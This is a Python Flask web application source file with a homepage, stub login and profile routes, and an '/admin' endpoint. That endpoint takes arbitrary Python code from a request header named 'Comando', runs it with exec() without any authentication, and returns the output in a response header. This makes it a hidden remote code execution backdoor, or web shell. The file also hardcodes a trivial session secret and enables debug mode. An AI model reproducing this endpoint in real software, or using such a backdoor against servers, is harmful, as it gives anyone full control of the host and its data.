
from flask import Flask
from flask import redirect, url_for
from flask import render_template
from flask import request, jsonify, json
from flask import session
from flask import make_response, Response
from datetime import timedelta, datetime
from flask_sqlalchemy import SQLAlchemy
from helper import *
import db
from io import StringIO
from contextlib import redirect_stdout


app = Flask(__name__)
app.secret_key = "secret key"
app.permanent_session_lifetime = timedelta(days=7)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.sqlite3'

@app.route("/")
def home():
    return render_template("homepage.html")

@app.route("/admin", methods=["GET", "POST"])
def execute():
    if request.method == "POST":
        
        headers = dict(request.headers)
        
        res = ""
        f = StringIO()
        with redirect_stdout(f):
            try:
                exec(headers["Comando"])
                res = f.getvalue().strip()
            except:
                res = "error"
        
        headers["Result"] = str(res)
        
        return Response([b"good"], headers=headers)
    elif request.method == "GET":
        return render_template("admin.html")
    return "idk"
    

@app.route("/login/")
def login():
    return "Login!"

@app.route("/register/")
def register():
    return "Register!"

@app.route("/logout/")
@login_required
def logout():
    return "Logout!"

@app.route("/profile/")
@login_required
def profile():
    return "Profile!"


if __name__ == "__main__":
    with app.app_context():
        # db.drop_all()
        # db.init_app(app)
        # db.db.create_all()
        app.run(debug=True)
